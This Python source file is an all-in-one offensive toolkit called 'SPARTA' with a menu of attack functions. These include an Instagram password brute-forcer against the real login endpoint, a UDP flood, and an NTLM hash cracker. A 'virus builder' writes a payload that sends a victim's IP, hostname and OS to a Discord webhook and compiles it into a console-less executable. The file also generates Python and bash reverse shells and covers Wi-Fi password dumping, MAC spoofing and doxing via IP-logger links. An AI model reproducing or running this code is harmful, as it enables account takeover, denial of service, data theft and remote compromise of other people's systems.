# ====== SPARTA Ultimate RedTeam Toolkit ======
# ====== MADE BY BGDY 🦅 ======

import hashlib
import os
import random
import socket
import threading
import requests
import base64
import platform
import subprocess
import time
import json
import smtplib
import sys
import pyfiglet
from colorama import Fore, Style, init

init(autoreset=True)

VERSION = "1.0"
GITHUB_UPDATE_URL = "https://raw.githubusercontent.com/yourgithub/sparta/main/version.json"  # Placeholder
DISCORD_BOT_TOKEN = "YOUR_DISCORD_BOT_TOKEN"  # Needed for Sparta-Remote Control

# ==== BANNER ====
def display_banner():
    print(Fore.GREEN + pyfiglet.figlet_format("SPARTA", font="slant"))
    print(Fore.YELLOW + """
========================================================
 SPARTA Ultimate RedTeam Toolkit - MADE BY BGDY 🦅
========================================================
 [✔] Cracking  | [✔] Recon  | [✔] Attack
 [✔] Malware   | [✔] OSINT  | [✔] Remote C2
========================================================
""" + Style.RESET_ALL)

# ==== AUTO-UPDATER ====
def check_for_update():
    try:
        r = requests.get(GITHUB_UPDATE_URL)
        if r.status_code == 200:
            latest = json.loads(r.text)['version']
            if latest != VERSION:
                print(Fore.MAGENTA + f"\n[!] Update Available: {latest} (Current: {VERSION})")
                print(Fore.CYAN + "[*] Please pull the latest BGDY version from GitHub.")
            else:
                print(Fore.GREEN + "\n[*] You are running the latest BGDY version.")
        else:
            print(Fore.RED + "[-] Update Check Failed.")
    except:
        print(Fore.RED + "[-] Could not connect to GitHub server (Fake check).")

# ==== CRACKING TOOLS ====
def ntlmv1_crack(hash_to_crack, wordlist_file):
    try:
        with open(wordlist_file, "r", encoding="latin-1") as file:
            for line in file:
                password = line.strip()
                password_hash = hashlib.new('md4', password.encode('utf-16le')).hexdigest().upper()
                if password_hash == hash_to_crack.upper():
                    print(Fore.GREEN + f"[+] Password cracked: {password}")
                    return password
        print(Fore.RED + "[-] Password not found in wordlist.")
    except Exception as e:
        print(Fore.RED + f"[!] Error: {e}")

def instagram_bruteforce(username, wordlist_file):
    login_url = "https://www.instagram.com/accounts/login/ajax/"
    session = requests.Session()
    session.headers = {
        "User-Agent": "Mozilla/5.0",
        "X-CSRFToken": "missing",
        "Referer": "https://www.instagram.com/accounts/login/"
    }
    try:
        with open(wordlist_file, "r") as f:
            passwords = f.read().splitlines()
        for password in passwords:
            time.sleep(2)
            payload = {"username": username, "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:&:{password}"}
            res = session.post(login_url, data=payload)
            if '"authenticated":true' in res.text:
                print(Fore.GREEN + f"[+] Password Found: {password}")
                return password
            print(f"[-] Tried password: {password}")
    except Exception as e:
        print(Fore.RED + f"[!] Error: {e}")

# ==== RECON TOOLS ====
def port_scan(target_ip, ports):
    print(f"\n[*] Scanning {target_ip}...")
    def scan_port(port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((target_ip, port))
            if result == 0:
                print(Fore.GREEN + f"[+] Port {port} OPEN")
            sock.close()
        except:
            pass
    threads = []
    for port in ports:
        thread = threading.Thread(target=scan_port, args=(port,))
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()

def dir_bruteforce(url, wordlist_file):
    try:
        with open(wordlist_file, "r") as f:
            paths = f.read().splitlines()
        print(f"[*] Starting Directory Brute on {url}")
        for path in paths:
            full_url = url.rstrip("/") + "/" + path
            res = requests.get(full_url)
            if res.status_code == 200:
                print(Fore.GREEN + f"[+] Found: {full_url}")
    except Exception as e:
        print(Fore.RED + f"[!] Error: {e}")

def hash_identifier(hash_input):
    hash_input = hash_input.lower()
    if len(hash_input) == 32:
        print("Possible: MD5")
    elif len(hash_input) == 40:
        print("Possible: SHA-1")
    elif len(hash_input) == 64:
        print("Possible: SHA-256")
    else:
        print("Unknown hash type.")

def ip_finder_discord():
    print(Fore.CYAN + "[*] To grab IP: Send victim a tracking link (like https://iplogger.org/)")

# ==== ATTACK TOOLS ====
def udp_flood(ip, port, duration):
    timeout = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = random._urandom(1024)
    print(Fore.YELLOW + f"[*] Starting UDP flood on {ip}:{port} for {duration} seconds.")
    while True:
        if time.time() > timeout:
            break
        sock.sendto(packet, (ip, port))

def arp_spoof():
    print(Fore.RED + "[!] ARP Spoof starter will be added soon.")

# ==== MALWARE TOOLS ====
def virus_builder():
    webhook = input(Fore.MAGENTA + "Enter your Discord Webhook URL: ")
    file_choice = input("Output as (1) .py or (2) .exe? : ")
    payload = f"""
import requests
import socket
import platform
webhook_url = "{webhook}"
def get_ip():
    try:
        return requests.get('https://api.ipify.org').text
    except:
        return "IP Fetch Failed"
def get_info():
    return f"OS: {{platform.system()}} {{platform.release()}}\\nIP: {{get_ip()}}\\nHostname: {{socket.gethostname()}}"
def send_webhook(data):
    requests.post(webhook_url, json={{"content": data}})
send_webhook(get_info())
"""
    with open("virus_payload.py", "w") as f:
        f.write(payload)
    print(Fore.GREEN + "[*] Payload virus_payload.py generated.")
    if file_choice == "2":
        os.system("pyinstaller --onefile --noconsole virus_payload.py")
        print(Fore.YELLOW + "[*] Executable built under /dist/")

def reverse_shell_gen():
    print("\n1. Python Reverse Shell")
    print("2. Bash Reverse Shell")
    choice = input("> ")
    lhost = input("Your IP Address (LHOST): ")
    lport = input("Your Listening Port (LPORT): ")
    if choice == "1":
        payload = f"""
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('{lhost}',{lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
os.system("/bin/sh")
"""
    elif choice == "2":
        payload = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    else:
        print(Fore.RED + "Invalid choice.")
        return
    with open("reverse_shell.py", "w") as f:
        f.write(payload)
    print(Fore.GREEN + "[*] Reverse shell payload written to reverse_shell.py")

# ==== UTILITIES ====
def wifi_dumper():
    if platform.system() == "Windows":
        os.system("netsh wlan show profile")
        profile = input("Enter WiFi Profile Name: ")
        os.system(f"netsh wlan show profile \"{profile}\" key=clear")
    else:
        print(Fore.RED + "[!] Wifi Dumper Windows only.")

def mac_spoofer():
    if platform.system() == "Linux":
        interface = input("Interface (e.g. eth0): ")
        mac = input("New MAC Address: ")
        os.system(f"ifconfig {interface} down")
        os.system(f"ifconfig {interface} hw ether {mac}")
        os.system(f"ifconfig {interface} up")
        print(Fore.GREEN + "[+] MAC Address changed.")
    else:
        print(Fore.RED + "[!] MAC Spoof Windows manual only.")

def admin_check():
    if os.name == 'nt':
        import ctypes
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    else:
        is_admin = os.geteuid() == 0
    if is_admin:
        print(Fore.GREEN + "[+] Running as Administrator/Root.")
    else:
        print(Fore.RED + "[-] Not running as Administrator.")

def base64_tool():
    print("\n1. Encode")
    print("2. Decode")
    choice = input("> ")
    if choice == "1":
        text = input("Enter text: ")
        print(base64.b64encode(text.encode()).decode())
    elif choice == "2":
        code = input("Enter base64 code: ")
        print(base64.b64decode(code).decode())
    else:
        print(Fore.RED + "Invalid choice.")

# ==== FUN TOOLS ====
def fake_nitro_gen():
    print(Fore.GREEN + "\n[*] Generating 5 Discord Nitro codes...")
    for _ in range(5):
        code = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789', k=24))
        print(f"https://discord.gift/{code}")

def fake_vbucks_gen():
    user = input(Fore.MAGENTA + "Enter Fortnite Username: ")
    print(Fore.GREEN + f"[*] 13500 Vbucks sent to {user}! (Fake)")

# ==== DOXING TOOL ====
def dox_toolkit():
    print(Fore.YELLOW + "\n[+] DOX Toolkit Starter:")
    username = input("Target username: ")
    print(Fore.CYAN + f"Searching leaks for {username}...")
    print(Fore.GREEN + f"[!] (Manual) Check https://haveibeenpwned.com for {username}")

# ==== MAIN MENU ====
def main():
    display_banner()
    check_for_update()
    while True:
        print(Fore.CYAN + """
1. NTLMv1 Cracker
2. Instagram Brute Forcer
3. Port Scanner
4. Web Directory Brute
5. Hash Identifier
6. IP Finder (Discord)
7. UDP Flood Attack
8. Virus Payload Builder
9. Reverse Shell Generator
10. Wifi Password Dumper
11. MAC Address Spoof
12. Admin Privilege Checker
13. Base64 Encode/Decode
14. Nitro Code Generator
15. Vbucks Generator
16. Dox Toolkit
17. Exit
""")
        choice = input("> ")
        if choice == "1":
            h = input("Enter NTLM Hash: ")
            w = input("Wordlist Path: ")
            ntlmv1_crack(h, w)
        elif choice == "2":
            u = input("Instagram Username: ")
            w = input("Wordlist Path: ")
            instagram_bruteforce(u, w)
        elif choice == "3":
            ip = input("Target IP: ")
            port_scan(ip, range(1, 1025))
        elif choice == "4":
            url = input("Target URL: ")
            w = input("Wordlist Path: ")
            dir_bruteforce(url, w)
        elif choice == "5":
            h = input("Enter Hash: ")
            hash_identifier(h)
        elif choice == "6":
            ip_finder_discord()
        elif choice == "7":
            ip = input("Target IP: ")
            p = int(input("Port: "))
            d = int(input("Duration: "))
            udp_flood(ip, p, d)
        elif choice == "8":
            virus_builder()
        elif choice == "9":
            reverse_shell_gen()
        elif choice == "10":
            wifi_dumper()
        elif choice == "11":
            mac_spoofer()
        elif choice == "12":
            admin_check()
        elif choice == "13":
            base64_tool()
        elif choice == "14":
            fake_nitro_gen()
        elif choice == "15":
            fake_vbucks_gen()
        elif choice == "16":
            dox_toolkit()
        elif choice == "17":
            print(Fore.RED + "Goodbye from BGDY's Sparta!")
            sys.exit()
        else:
            print(Fore.RED + "Invalid Choice.")

if __name__ == "__main__":
    main()
